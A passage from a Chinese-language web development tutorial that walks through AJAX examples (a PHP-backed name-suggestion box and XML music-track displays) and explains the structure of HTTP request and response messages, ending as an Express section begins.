class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">showHint</span>(<span class="params">str</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> xhttp;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 判断input值是否为空</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (str.length == <span class="number">0</span>) &#123; </span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 为空，则返回空</span></span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.getElementById(<span class="string">&quot;txtHint&quot;</span>).innerHTML = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="comment">// input值不为空，则创建一个XMLHttpRequest()对象</span></span></span><br><span class="line"><span class="javascript">                xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 监听readyState属性的变化，一旦变化就会触发onreadystatechange事件</span></span></span><br><span class="line"><span class="javascript">                xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="comment">// 获取响应回来的数据，类型是字符串</span></span></span><br><span class="line"><span class="javascript">                        <span class="built_in">document</span>.getElementById(<span class="string">&quot;txtHint&quot;</span>).innerHTML = <span class="built_in">this</span>.responseText;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"><span class="javascript">                <span class="comment">// 发送请求</span></span></span><br><span class="line"><span class="javascript">                xhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/demo/gethint.php?q=&quot;</span>+str, <span class="literal">true</span>);</span></span><br><span class="line">                xhttp.send();   </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>PHP 文件 - “gethint.php”</strong></p><p>这个 PHP 文件检查姓名数组，然后向浏览器返回对应的姓名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 姓名数组</span></span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Ava&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Brielle&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Caroline&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Diana&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Elise&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Fiona&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Grace&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Hannah&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Ileana&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Jane&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Kathryn&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Laura&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Millie&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Nancy&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Opal&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Petty&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Queenie&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Rose&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Shirley&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Tiffany&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Ursula&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Victoria&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Wendy&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Xenia&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Yvette&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Zoe&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Angell&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Adele&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Beatty&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Carlton&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Elisabeth&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span>[] = <span class="string">&quot;Violet&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 URL 获取 q 参数</span></span><br><span class="line"><span class="variable">$q</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;q&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看数组中所有 hint，$q 是否与 &quot;&quot; 相同</span></span><br><span class="line"><span class="comment">// 判断传递过来的参数是否为空</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$q</span> !== <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 将传递过来的参数转换为小写</span></span><br><span class="line">    <span class="variable">$q</span> = strtolower(<span class="variable">$q</span>);</span><br><span class="line">    <span class="comment">// 获取参数的长度</span></span><br><span class="line">    <span class="variable">$len</span>=strlen(<span class="variable">$q</span>);</span><br><span class="line">    <span class="comment">// 根据参数去遍历出显示的数据，$name作为$a的别名</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断参数的值是否匹配到$name中的数据，stristr(传递过来的参数，根据参数的长度从$name的值中截取出来和$q长度一样的值与$q匹配</span></span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="variable">$q</span>, substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="variable">$len</span>))) &#123;</span><br><span class="line">            <span class="comment">// 找到第一个匹配到的值，因为$hint的值为空，则赋值给了$hint</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$hint</span> === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="variable">$hint</span> = <span class="variable">$name</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 找到第二个匹配到的值，因为$hint值不为空，则与第一个匹配到的值进行拼串，以此类推</span></span><br><span class="line">                <span class="variable">$hint</span> .= <span class="string">&quot;, <span class="subst">$name</span>&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找不到响应的值，则会返回提示，找到了，则返回匹配到的数据</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$hint</span> === <span class="string">&quot;&quot;</span> ? <span class="string">&quot;no suggestion&quot;</span> : <span class="variable">$hint</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220414203949473.png" alt=""></p><h3 id="XML-应用程序"><a href="#XML-应用程序" class="headerlink" title="XML 应用程序"></a>XML 应用程序</h3><h5 id="在曲目之间导航"><a href="#在曲目之间导航" class="headerlink" title="在曲目之间导航"></a>在曲目之间导航</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">HTML</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;showMUSIC&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 上一曲 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;previous()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;&lt;&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 下一曲 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;next()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&gt;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> i = <span class="number">0</span>, len;</span></span><br><span class="line">            displayMUSIC(0);</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">displayMUSIC</span>(<span class="params">i</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 创建 XMLHttpRequest 对象</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 监听readyState属性的变化，一旦变化就会触发onreadystatechange事件</span></span></span><br><span class="line"><span class="javascript">                xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">                        myFunction(<span class="built_in">this</span>, i);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"><span class="javascript">                xmlhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/demo/music_list.xml&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line">                xmlhttp.send();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">xml, i</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 响应返回了一个XMl DOM 对象的数据</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> xmlDoc = xml.responseXML; </span></span><br><span class="line"><span class="javascript">                <span class="comment">// 获取 TRACK 标签，会返回一个集合</span></span></span><br><span class="line"><span class="javascript">                x = xmlDoc.getElementsByTagName(<span class="string">&quot;TRACK&quot;</span>);</span></span><br><span class="line">                </span><br><span class="line"><span class="javascript">                <span class="comment">// 获取长度</span></span></span><br><span class="line">                len = x.length;</span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">&quot;showMUSIC&quot;</span>).innerHTML =</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;ul&gt;&quot;</span> + </span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;曲目：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 获取第一个 TRACK 标签的子节点是 TITLE 标签，通过childNodes[0]获得 TITLE 的子节点（TITLE标签的内容）</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 通过nodeValue获取TITLE标签的内容</span></span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;TITLE&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;艺术家：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;ARTIST&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;专辑：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;ALBUM&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;国家：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;COUNTRY&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;公司：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;COMPANY&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;年份：&quot;</span> + </span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;YEAR&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="comment">// 通过myFunction函数的第二个参数来切换曲目的信息</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (i &lt; len-<span class="number">1</span>) &#123;</span></span><br><span class="line">                    i++;</span><br><span class="line">                    displayMUSIC(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">previous</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line">                    i--;</span><br><span class="line">                    displayMUSIC(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220414204250145.png" alt=""></p><h5 id="在点击歌曲时显示专辑信息"><a href="#在点击歌曲时显示专辑信息" class="headerlink" title="在点击歌曲时显示专辑信息"></a>在点击歌曲时显示专辑信息</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">HTML</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        table,th,td &#123;</span><br><span class="line">            border : 1px solid black;</span><br><span class="line">            border-collapse: collapse;</span><br><span class="line">        &#125;</span><br><span class="line">        th,td &#123;</span><br><span class="line">            padding: 5px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>请点击某个曲目，可显示专辑信息。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;showMUSIC&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> x,xmlhttp,xmlDoc</span></span><br><span class="line"><span class="javascript">            xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">            xmlhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/demo/music_list.xml&quot;</span>, <span class="literal">false</span>);</span></span><br><span class="line">            xmlhttp.send();</span><br><span class="line">            xmlDoc = xmlhttp.responseXML; </span><br><span class="line"><span class="javascript">            x = xmlDoc.getElementsByTagName(<span class="string">&quot;TRACK&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">            table=&quot;<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>艺术家<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>曲目<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;x.length; i++) &#123; </span></span><br><span class="line"><span class="javascript">                <span class="comment">// 给曲目添加了一个点击事件</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                table += &quot;<span class="tag">&lt;<span class="name">tr</span> <span class="attr">onclick</span>=<span class="string">&#x27;displayMUSIC(&quot; + i + &quot;)&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="javascript">                table += x[i].getElementsByTagName(<span class="string">&quot;ARTIST&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                table += &quot;<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="javascript">                table +=  x[i].getElementsByTagName(<span class="string">&quot;TITLE&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                table += &quot;<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>&quot;;</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = table;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">displayMUSIC</span>(<span class="params">i</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">&quot;showMUSIC&quot;</span>).innerHTML =</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;ul&gt;&quot;</span> + </span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;曲目：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;TITLE&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;艺术家：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;ARTIST&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;专辑：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;ALBUM&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;国家：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;COUNTRY&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;公司：&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;COMPANY&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;li&gt;年份：&quot;</span> + </span></span><br><span class="line"><span class="javascript">                    x[i].getElementsByTagName(<span class="string">&quot;YEAR&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue + <span class="string">&quot;&lt;/li&gt;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220414204403794.png" alt=""></p><h1 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h1><p>HTT(hypertext transport protocol)协议『超文本传输协议」，协议详细规定了<strong>浏览器和万维网服务器之间互相通信的规则</strong>。</p><h3 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">重点是格式与参数</span><br><span class="line">行POST &#x2F;s?ie&#x3D;utf-8HTTP&#x2F;1.1</span><br><span class="line">头Host:atguigu.com</span><br><span class="line">Cookie:name&#x3D;guigu</span><br><span class="line">Content-type:application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent:chrome 83</span><br><span class="line">空行</span><br><span class="line">体username&#x3D;admin&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure><h3 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">行HTTP&#x2F;1.1 2200 OK</span><br><span class="line">头Content-Type:text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Content-length:2048</span><br><span class="line">Content-encoding:gzip</span><br><span class="line">空行</span><br><span class="line">体&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;尚硅谷&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html</span><br></pre></td></tr></table></figure><h1 id="Express框架"><a href="#Express框架" class="headerlink" title="Express框架"></a>Express框架</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 